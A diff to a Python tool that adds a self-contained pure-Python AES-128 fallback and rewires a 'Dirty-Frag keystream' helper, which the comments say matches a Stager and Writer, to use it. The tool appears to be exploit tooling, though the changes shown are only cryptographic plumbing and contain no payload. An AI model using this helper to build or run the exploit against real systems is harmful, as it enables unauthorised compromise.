@@ -21,12 +21,51 @@
 #  targets/<name>/ and the JSON. No code changes.
 # ============================================================================================
 import argparse, json, os, re, struct, subprocess, sys, time, threading
+# AES-128 for the Dirty-Frag keystream. Fast path = pycryptodome; if absent, fall back to a
+# self-contained pure-Python AES-128 (verified vs pycryptodome + FIPS-197) so the tool has NO hard
+# third-party dependency and runs on any Python (Windows without a C compiler included).
 try:
     from Crypto.Cipher import AES
+    def _aes128(key16): return AES.new(key16, AES.MODE_ECB).encrypt   # -> encrypt(block)->16B
 except ModuleNotFoundError:
-    sys.exit(f"pycryptodome not found for THIS interpreter:\n  {sys.executable}\n"
-             f"Install it into this exact python (a bare `pip` may target a different one):\n"
-             f'  "{sys.executable}" -m pip install pycryptodome')
+    _SBOX = bytes.fromhex("637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b27509832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cfd0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdbe0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9ee1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16")
+    _RCON = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36]
+    def _xt(a): return ((a<<1)^0x1b)&0xff if a&0x80 else (a<<1)
+    def _expand(key):
+        w=[list(key[i*4:i*4+4]) for i in range(4)]
+        for i in range(4,44):
+            t=list(w[i-1])
+            if i%4==0:
+                t=t[1:]+t[:1]; t=[_SBOX[b] for b in t]; t[0]^=_RCON[i//4-1]
+            w.append([w[i-4][j]^t[j] for j in range(4)])
+        return w
+    def _enc(w, blk):
+        s=[list(blk[i*4:i*4+4]) for i in range(4)]
+        for c in range(4):
+            for j in range(4): s[c][j]^=w[c][j]
+        for rnd in range(1,10):
+            s2=[[_SBOX[s[c][j]] for j in range(4)] for c in range(4)]
+            rows=[[s2[c][j] for c in range(4)] for j in range(4)]
+            rows=[rows[j][j:]+rows[j][:j] for j in range(4)]
+            cols=[[rows[j][c] for j in range(4)] for c in range(4)]
+            s=[]
+            for a in cols:
+                s.append([_xt(a[0])^_xt(a[1])^a[1]^a[2]^a[3],
+                          a[0]^_xt(a[1])^_xt(a[2])^a[2]^a[3],
+                          a[0]^a[1]^_xt(a[2])^_xt(a[3])^a[3],
+                          _xt(a[0])^a[0]^a[1]^a[2]^_xt(a[3])])
+            for c in range(4):
+                for j in range(4): s[c][j]^=w[rnd*4+c][j]
+        s2=[[_SBOX[s[c][j]] for j in range(4)] for c in range(4)]
+        rows=[[s2[c][j] for c in range(4)] for j in range(4)]
+        rows=[rows[j][j:]+rows[j][:j] for j in range(4)]
+        s=[[rows[j][c] for j in range(4)] for c in range(4)]
+        for c in range(4):
+            for j in range(4): s[c][j]^=w[40+c][j]
+        return bytes(s[c][j] for c in range(4) for j in range(4))
+    def _aes128(key16):
+        w = _expand(key16)
+        return lambda blk: _enc(w, blk)
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 sys.path.insert(0, HERE)
@@ -47,8 +86,8 @@ R_AARCH64_CALL26 = 0x11b
 # ---- Dirty-Frag keystream (matches Stager/Writer) ----
 def keystream0_fn(keymat_base):
     KEYMAT = bytes((keymat_base + i) & 0xff for i in range(20))
-    ecb = AES.new(KEYMAT[:16], AES.MODE_ECB); SALT = KEYMAT[16:20]
-    return lambda iv: ecb.encrypt(SALT + iv + b"\x00\x00\x00\x02")[0]
+    enc = _aes128(KEYMAT[:16]); SALT = KEYMAT[16:20]
+    return lambda iv: enc(SALT + iv + b"\x00\x00\x00\x02")[0]
 
 # ============================== logging ==============================
 C = dict(r="\033[0m", b="\033[1m", dim="\033[2m", red="\033[31m", grn="\033[32m",
